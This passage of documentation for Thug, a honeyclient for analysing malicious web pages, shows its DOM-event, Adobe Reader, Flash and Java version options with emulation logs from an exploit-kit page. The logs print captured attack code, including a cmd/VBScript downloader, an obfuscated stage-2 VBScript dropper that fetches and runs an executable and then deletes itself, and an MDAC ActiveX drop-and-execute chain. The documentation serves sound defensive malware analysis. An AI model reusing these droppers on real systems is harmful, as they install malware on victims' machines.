;
[2012-07-02 19:21:11] &lt;param name="movie" value="data/field.swf"&gt;&lt;/param&gt;
[2012-07-02 19:21:11] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf
[2012-07-02 19:21:17] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
[2012-07-02 19:21:17] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
[2012-07-02 19:21:17] &lt;param name="allowScriptAccess" value="always"&gt;&lt;/param&gt;
[2012-07-02 19:21:17] &lt;param name="Play" value="0"&gt;&lt;/param&gt;
[2012-07-02 19:21:17] &lt;embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"&gt;&lt;/embed&gt;
[2012-07-02 19:21:17] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf
[2012-07-02 19:21:18] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
[2012-07-02 19:21:18] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
[2012-07-02 19:21:18] Saving log analysis at ../logs/baa880d8d79c3488f2c0557be24cca6b/20120702192057</pre>
</div>
<p>It&#8217;s quite simple to realize that the exploit for the Microsoft Data Access Components (MDAC)
vulnerability is not served as previously staten.</p>
</div>
<div class="section" id="dom-events-handling">
<h2>DOM Events Handling<a class="headerlink" href="#dom-events-handling" title="Permalink to this headline">¶</a></h2>
<p>A useful option is the -e (&#8211;events) option which allows you to specify which DOM events should
be handled by Thug. By default <cite>load</cite> and <cite>mousemove</cite> events are always handled but you can add
other ones with this option. Using this option is quite simple. All you need to do is to specify
a comma-separated list of events to handle as shown below.</p>
<div class="highlight-sh"><div class="highlight"><pre>~/thug/src <span class="nv">$ </span>python thug.py -e click,mouseover URL
</pre></div>
</div>
<p>In this example, the DOM events <cite>load</cite>, <cite>mousemove</cite>, <cite>click</cite> and <cite>mouseover</cite> will be handled by
Thug while all the others will be ignored.</p>
</div>
<div class="section" id="adobe-acrobat-reader">
<h2>Adobe Acrobat Reader<a class="headerlink" href="#adobe-acrobat-reader" title="Permalink to this headline">¶</a></h2>
<p>Taking a look at the available options you can see the -A (&#8211;adobepdf) option which is quite
useful for getting different PDF exploits which target different version of Adobe Acrobat
Reader. This happens because exploit kits usually serve PDF files which exploit specific
vulnerabilities basing on Adobe Acrobat Reader version. Let&#8217;s take a look at what happens if
we try to analyze the same page with Adobe Acrobat Reader 8.1.0 instead of 7.1.0 which is
the default one.</p>
<div class="highlight-sh"><pre>~/thug/src $ python thug.py -A 8.1.0 "http://[omitted]/main.php?page=8c6c59becaa0da07"
[2012-07-02 19:18:00] [HTTP] URL: http://[omitted]/main.php?page=8c6c59becaa0da07 (Status: 200, Referrer: None)
[2012-07-02 19:18:00] &lt;applet archive="Ryp.jar" code="sIda.sIda"&gt;&lt;param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"&gt;&lt;/param&gt;&lt;/applet&gt;
[2012-07-02 19:18:00] [Navigator URL Translation] Ryp.jar --&gt;  http://[omitted]/Ryp.jar
[2012-07-02 19:18:03] [HTTP] URL: http://[omitted]/Ryp.jar (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
[2012-07-02 19:18:03] Saving applet Ryp.jar
[2012-07-02 19:18:04] ActiveXObject: msxml2.xmlhttp
[2012-07-02 19:18:04] ActiveXObject: acropdf.pdf
[2012-07-02 19:18:04] Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
[2012-07-02 19:18:04] Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
[2012-07-02 19:18:04] Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
[2012-07-02 19:18:04] Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
[2012-07-02 19:18:04] Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
[2012-07-02 19:18:04] ActiveXObject: shockwaveflash.shockwaveflash.10
[2012-07-02 19:18:04] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (adodb.stream)
[2012-07-02 19:18:04] ActiveXObject: adodb.stream
[2012-07-02 19:18:04] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (Shell.Application)
[2012-07-02 19:18:04] ActiveXObject: shell.application
[2012-07-02 19:18:04] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (msxml2.XMLHTTP)
[2012-07-02 19:18:04] ActiveXObject: msxml2.xmlhttp
[2012-07-02 19:18:04] [Microsoft XMLHTTP ActiveX] Fetching from URL http://[omitted]/w.php?f=b081d&amp;e=2
[2012-07-02 19:18:07] [HTTP] URL: http://[omitted]/w.php?f=b081d&amp;e=2 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
[2012-07-02 19:18:08] [Microsoft XMLHTTP ActiveX] Saving File: d328b5a123bce1c0d20d763ad745303a
[2012-07-02 19:18:08] [Microsoft XMLHTTP ActiveX] send
[2012-07-02 19:18:08] [Adodb.Stream ActiveX] open
[2012-07-02 19:18:08] [Adodb.Stream ActiveX] Write
[2012-07-02 19:18:08] [Adodb.Stream ActiveX] SaveToFile (.//..//3c9f737.exe)
[2012-07-02 19:18:08] [Adodb.Stream ActiveX] Close
[2012-07-02 19:18:08] [Shell.Application ActiveX] ShellExecute command: .//..//3c9f737.exe
[2012-07-02 19:18:08] [Navigator URL Translation] ./data/ap2.php --&gt;  http://[omitted]/data/ap2.php
[2012-07-02 19:18:14] [HTTP] URL: http://[omitted]/data/ap2.php (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
[2012-07-02 19:18:15] Microsoft Internet Explorer HCP Scheme Detected
[2012-07-02 19:18:15] Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
[2012-07-02 19:18:15] [AST]: Eval argument length &gt; 64
[2012-07-02 19:18:15] [Windows Script Host Run] Command:
cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe

[2012-07-02 19:18:15] [Windows Script Host Run - Stage 1] Code:
cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe
[2012-07-02 19:18:15] [Windows Script Host Run - Stage 1] Downloading from URL http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0
[2012-07-02 19:18:16] [HTTP] URL: http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
[2012-07-02 19:18:16] [Windows Script Host Run - Stage 1] Saving file d26b9b1a1f667004945d1d000cf4f19e
[2012-07-02 19:18:16] [Windows Script Host Run - Stage 2] Code:
w=3000:x=200:y=1:z=false:a = "http://[omitted]/w.php?e=5&amp;f=b081d":Set e = Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS")):Set f=e.GetSpecialFolder(2):b = f &amp; "\exe.ex2":b=Replace(b,Month("2010-02-16"),"e"):OT = "GET":Set c = CreateObject(StrReverse("PTTHLMX.2LMXSM")):Set d = CreateObject(StrReverse("ertS.BDODA") &amp; "am")
Set o=Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS"))
On Error resume next
c.open OT, a, z:c.send()
If c.Status = x Then
d.Open:d.Type = y:d.Write c.ResponseBody:d.SaveToFile b:d.Close
End If
Set w=CreateObject(StrReverse("llehS." &amp; "tpi"&amp;"rcSW"))
Eval(Replace("W.ex2c b", Month("2010-02-16"), "E"))
W.eXeC "taskkill /F /IM wm" &amp; "player.e" &amp; "xe":W.eXeC "taskkill /F /IM realplay.ex" &amp; "e":Set g=o.GetFile(e.GetSpecialFolder(3-1) &amp; "\" &amp; StrReverse("bv.l") &amp; "s"):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval("g.Delete")

[2012-07-02 19:18:16] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d
[2012-07-02 19:18:20] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
[2012-07-02 19:18:22] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a
[2012-07-02 19:18:22] &lt;object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" height="10" id="swf_id" width="10"&gt;&lt;param name="movie" value="data/field.swf"&gt;&lt;/param&gt;&lt;param name="allowScriptAccess" value="always"&gt;&lt;/param&gt;&lt;param name="Play" value="0"&gt;&lt;/param&gt;&lt;embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"&gt;&lt;/embed&gt;&lt;/object&gt;
[2012-07-02 19:18:22] &lt;param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"&gt;&lt;/param&gt;
[2012-07-02 19:18:22] &lt;param name="movie" value="data/field.swf"&gt;&lt;/param&gt;
[2012-07-02 19:18:22] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf
[2012-07-02 19:18:27] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
[2012-07-02 19:18:28] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
[2012-07-02 19:18:28] &lt;param name="allowScriptAccess" value="always"&gt;&lt;/param&gt;
[2012-07-02 19:18:28] &lt;param name="Play" value="0"&gt;&lt;/param&gt;
[2012-07-02 19:18:28] &lt;embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"&gt;&lt;/embed&gt;
[2012-07-02 19:18:28] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf
[2012-07-02 19:18:28] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
[2012-07-02 19:18:29] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
[2012-07-02 19:18:29] Saving log analysis at ../logs/baa880d8d79c3488f2c0557be24cca6b/20120702191758</pre>
</div>
<p>Comparing the following line</p>
<div class="highlight-sh"><div class="highlight"><pre><span class="o">[</span>2012-07-02 19:18:14<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap2.php <span class="o">(</span>Status: 200, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
</pre></div>
</div>
<p>with what we saw using Adobe Acrobat Reader 7.1.0</p>
<div class="highlight-sh"><div class="highlight"><pre><span class="o">[</span>2012-07-02 19:15:36<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d <span class="o">(</span>Status: 200, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
</pre></div>
</div>
<p>it&#8217;s easy to realize that a different PDF file was served in this case.</p>
</div>
<div class="section" id="shockwave-flash">
<h2>Shockwave Flash<a class="headerlink" href="#shockwave-flash" title="Permalink to this headline">¶</a></h2>
<p>Taking a look at the available options you can see the -S (&#8211;shockwave) option which is quite
useful for getting different Flash exploits which target differents version of Shockwave Flash.
This happens because exploit kits usually serve Flash files which exploit specific vulnerabilities
basing on Shockwave Flash version. Let&#8217;s take a look at what happens if we locally analyze
PluginDetect which is currently used by Blackhole exploit kit (see Local Analysis later for details).</p>
<div class="highlight-sh"><div class="highlight"><pre>~/thug/src <span class="nv">$ </span>python thug.py -l ../samples/misc/PluginDetect-0.7.8.html
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> ActiveXObject: acropdf.pdf
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.1.0
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.0.0
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.1.0
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.0.0
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.7.1.0
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.7.0.0
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.6.0.0
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> ActiveXObject: javaplugin.160_40
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.6.0.0
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: AdobeReader version: 7,1,0,0
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Flash version: 10,0,64,0
<span class="o">[</span>2012-07-16 23:22:44<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Java version: 1,6,0,40
</pre></div>
</div>
<p>Let&#8217;s try with different Adobe Acrobat Reader and Shockwave Flash versions now.</p>
<div class="highlight-sh"><div class="highlight"><pre>~/thug/src <span class="nv">$ </span>python thug.py -l -A 8.1.0 -S 10.3.1.180 ../samples/misc/PluginDetect-0.7.8.html
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> ActiveXObject: acropdf.pdf
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.1.0
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.0.0
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.1.0
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.0.0
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.7.1.0
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.7.0.0
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.6.0.0
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> ActiveXObject: javaplugin.160_40
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.6.0.0
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: AdobeReader version: 8,1,0,0
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Flash version: 10,3,1,180
<span class="o">[</span>2012-07-16 23:28:57<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Java version: 1,6,0,40
</pre></div>
</div>
</div>
<div class="section" id="javaplugin-and-javawebstart">
<h2>JavaPlugin and JavaWebStart<a class="headerlink" href="#javaplugin-and-javawebstart" title="Permalink to this headline">¶</a></h2>
<p>Taking a look at the available options you can see the -J (&#8211;javaplugin) option which is quite
useful for getting different Java exploits which target different versions of Java. Let&#8217;s take
a look at what happens if we locally analyze PluginDetect which is currently used by Blackhole
exploit kit (see Local Analysis later for details).</p>
<div class="highlight-sh"><div class="highlight"><pre>~/thug/src <span class="nv">$ </span>python thug.py -l ../samples/misc/PluginDetect-0.7.8.html
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> ActiveXObject: acropdf.pdf
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.1.0
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.0.0
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.1.0
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.0.0
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.7.1.0
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> Unknown ActiveX Object: javaplugin.171_40
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> Unknown ActiveX Object: javaplugin.171_39
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> Unknown ActiveX Object: javaplugin.171_38
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> Unknown ActiveX Object: javaplugin.171_37
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> Unknown ActiveX Object: javaplugin.171_36
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> Unknown ActiveX Object: javaplugin.171_35
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> Unknown ActiveX Object: javaplugin.171_34
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> Unknown ActiveX Object: javaplugin.171_33
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> Unknown ActiveX Object: javaplugin.171_32
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> Unknown ActiveX Object: javaplugin.171_31
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> ActiveXObject: javaplugin.171_30
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.7.1.0
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: AdobeReader version: 7,1,0,0
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Flash version: 10,0,64,0
<span class="o">[</span>2012-08-19 17:43:35<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Java version: 1,7,1,30
</pre></div>
</div>
<p>Let&#8217;s try with a different JavaPlugin version now.</p>
<div class="highlight-sh"><div class="highlight"><pre>~/thug/src <span class="nv">$ </span>python thug.py -l -J 1.8.1.20 ../samples/misc/PluginDetect-0.7.8.html
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> ActiveXObject: acropdf.pdf
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.1.0
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.0.0
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.8.1.0
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javaplugin.181_40
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javaplugin.181_39
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javaplugin.181_38
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javaplugin.181_37
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javaplugin.181_36
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javaplugin.181_35
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javaplugin.181_34
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javaplugin.181_33
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javaplugin.181_32
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javaplugin.181_31
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javaplugin.181_30
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javaplugin.181_29
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javaplugin.181_28
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javaplugin.181_27
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javaplugin.181_26
<span class="o">[</span>2012-08-19 17:44:17<span class="o">]</span> Unknown ActiveX Object: javaplugin.181_25
